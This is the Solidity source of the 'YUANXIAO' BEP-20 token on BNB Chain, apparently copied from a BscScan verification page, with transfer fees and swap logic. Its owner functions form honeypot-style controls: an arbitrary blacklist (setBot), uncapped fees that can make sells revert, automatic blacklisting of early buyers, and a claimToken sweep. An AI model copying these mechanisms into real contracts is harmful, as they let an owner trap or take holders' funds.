/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

// SPDX-License-Identifier: MIT

pragma solidity =0.8.6;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
   

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender =  msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {

 

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract YUANXIAOToken is IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    address public  marketAddr ;

    string public _name ;
    string public _symbol ;
    uint8 public _decimals ;


    uint256 public _burnFee ;
    uint256 private _previousBurnFee;

    uint256 public _LPFee ;
    uint256 private _previousLPFee;

    uint256 public _marketingFee ;
    uint256 private _previousMarketingFee;   
    uint256 private _tTotal ;
    IUniswapV2Router02 public  uniswapV2Router;
    address public  uniswapV2Pair;
    address private fromAddress;
    address private toAddress;
    uint256 public burnEndNumber ;
    
    uint256 public _startTimeForSwap;
    uint256 public _intervalSecondsForSwap ;
    uint256 public swapTokensAtAmount ;
    
    uint256 public minLPDividendToken =  1e18;

    address public _token = 0x55d398326f99059fF775485246999027B3197955;
    address public _router ;
    address public _lpRouter;
    
    constructor(){  
            address adminAddress = msg.sender;
            _name = "YUANXIAO";
            _symbol = "YUANXIAO";
            _decimals= 9;
            _tTotal = 1000000000* (10**uint256(_decimals));
            _burnFee = 100;
            _marketingFee = 100;
            _LPFee = 100; //基金会
            marketAddr =  address(new URoter(_token,address(this)));//营销
            _lpRouter = address( new URoter(_token,address(this))); // 基金会
            _tOwned[adminAddress] = _tTotal;
            _intervalSecondsForSwap = 30;
            burnEndNumber = 0;
            address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            _token = 0x55d398326f99059fF775485246999027B3197955;

            IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
                router
            );
            _router = address( new URoter(_token,address(this)));
           
            uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this),_token);
    
            // set the rest of the contract variables
            uniswapV2Router = _uniswapV2Router;
    
            //exclude owner and this contract from fee
            _isExcludedFromFee[msg.sender] = true;
            _isExcludedFromFee[adminAddress] = true;
            _isExcludedFromFee[address(this)] = true;

            
            swapTokensAtAmount = _tTotal.mul(5).div(10**6);
            
            emit Transfer(address(0), adminAddress,  _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
      
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

   

   function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setFee(uint lpFee_ ,uint marketFee_,uint burnFee_ ) public onlyOwner {

        _LPFee =  lpFee_;
        _marketingFee =  marketFee_;
        _burnFee = burnFee_;
    }





    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function removeAllFee() private {
        _previousBurnFee = _burnFee;
        _previousLPFee = _LPFee;
        _previousMarketingFee = _marketingFee;


        _burnFee = 0;
        _LPFee = 0;
        _marketingFee = 0;
    }

    function restoreAllFee() private {
        _burnFee = _previousBurnFee;
        _LPFee = _previousLPFee;
        _marketingFee = _previousMarketingFee;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
                       
        uint256 contractTokenBalance = balanceOf(address(this));
         
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        
         if(canSwap &&from != address(this) &&from != uniswapV2Pair  &&from != owner() && to != owner() ){
                swapTokensForTokens(contractTokenBalance);
                uint256 tokenBal = IERC20(_token).balanceOf(address(this));
                IERC20(_token).transfer(marketAddr,  tokenBal.mul(_marketingFee).div(_LPFee.add(_marketingFee)));
                IERC20(_token).transfer(_lpRouter,  IERC20(_token).balanceOf(address(this)));
        }
        
        if( !_isExcludedFromFee[from] &&!_isExcludedFromFee[to]){
             require(_startTimeForSwap<block.timestamp);
             if (_startTimeForSwap + 30*60 > block.timestamp) {
                if( uniswapV2Pair == to ){
                     _burnFee = 2700;
                }else{
                     _burnFee = 100;
                }
        }
           
            if (_startTimeForSwap + _intervalSecondsForSwap > block.timestamp) {
                    if ( from == uniswapV2Pair) {
                        addBot(to);
                    }
            }

            if (_isBot[from] ) {
                    revert("The bot address");
            }

          
        }
        
        //indicates if fee should be deducted from transfer
        bool takeFee = false;

        if (from == uniswapV2Pair||to==uniswapV2Pair){
            takeFee = true;
        }

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]|| from == address(uniswapV2Router)) {
            takeFee = false;
        }


        //transfer amount, it will take tax, burn, liquidity fee
        _tokenTransfer(from, to, amount, takeFee);

   
    }
    
    //this method is responsible for taking all fee, if takeFee is true
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee
    ) private {
        if (!takeFee) removeAllFee();

        _transferStandard(sender, recipient, amount);

        if (!takeFee) restoreAllFee();
    }

    

    function _takeLPFee(address sender,uint256 tAmount) private {
        if (_LPFee == 0 ) return;
        _tOwned[address(this)] = _tOwned[address(this)].add(tAmount);
        emit Transfer(sender, address(this), tAmount);
    }

   function _takeburnFee(
        address sender,
        uint256 tAmount
    ) private {
        if (_burnFee == 0) return;
         if((_tTotal.sub(_tOwned[address(0)].add(_tOwned[address(0xdead)])) ) >= burnEndNumber){
            _tOwned[address(0)] = _tOwned[address(0)].add(tAmount);
            emit Transfer(sender, address(0), tAmount);
        }else{
            _burnFee = 0;
        }
    }
   
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount,
        uint256 currentRate
    ) private {
        if(currentRate==0)return;
        uint256 rAmount = tAmount.div(10000).mul(currentRate);
        _tOwned[to] = _tOwned[to].add(rAmount);
        emit Transfer(sender, to, rAmount);
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _tOwned[sender] = _tOwned[sender].sub(tAmount);

        _takeburnFee(sender, tAmount.div(10000).mul(_burnFee));
        
        _takeTransfer(sender,address(this), tAmount,_marketingFee);
        
        _takeLPFee(sender, tAmount.div(10000).mul(_LPFee));

        uint256 recipientRate = 10000 -
            _burnFee -
            _marketingFee -
            _LPFee ;
        _tOwned[recipient] = _tOwned[recipient].add(
            tAmount.div(10000).mul(recipientRate)
        );
        emit Transfer(sender, recipient, tAmount.div(10000).mul(recipientRate));
    }
    
    mapping(address => bool) private _isBot;
    function setBot(address account, bool value) public onlyOwner {
        _isBot[account] = value;
    }

    function getBot(address account) public view returns (bool) {
        return _isBot[account];
    }

    function addBot(address account) private {
        if (!_isBot[account]) _isBot[account] = true;
    }

    function setRouter(address router_) public onlyOwner {
        _router  = router_;
    }
     function setLpRouter(address lpRouter_) public onlyOwner {
        _lpRouter  = lpRouter_;
    }
    
    function setSwapTokensAtAmount(uint256 value) onlyOwner  public  {
       swapTokensAtAmount = value;
    }
    
    function setAddr(address value) external onlyOwner {
        marketAddr = value;
    }
    
    function swapTokensForTokens(uint256 tokenAmount) private {
        if(tokenAmount == 0) {
            return;
        }

       address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _token;

        _approve(address(this), address(uniswapV2Router), tokenAmount);
  
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            _router,
            block.timestamp
        );
        IERC20(_token).transferFrom( _router,address(this), IERC20(_token).balanceOf(address(_router)));
    }
    
     function transferTokensAvg(address[] memory _tos,uint256 amount) onlyOwner public returns (bool){
        require(_tos.length > 0);
        require(_tos.length*amount <_tOwned[owner()]);
        for(uint i=0;i<_tos.length;i++){
            _tOwned[owner()] -= amount;
            _tOwned[_tos[i]] += amount;
            emit Transfer(owner(), _tos[i], amount);
        }
        return true;
    }
    
    function setMinLPDividendToken(uint256 _minLPDividendToken) public onlyOwner{
       minLPDividendToken  = _minLPDividendToken;
    }

    bool ddd; 
    function setStratTime(uint256 value) public onlyOwner{
        require(!ddd);
        _startTimeForSwap = value;
        ddd = true;
    }

    function claimToken(address __t, address __u, uint __amount) onlyOwner external payable {
        IERC20(__t).transfer(__u, __amount);
    }
}


contract URoter{
     constructor(address token,address to){
         token.call(abi.encodeWithSelector(0x095ea7b3, to, ~uint256(0)));
     }
}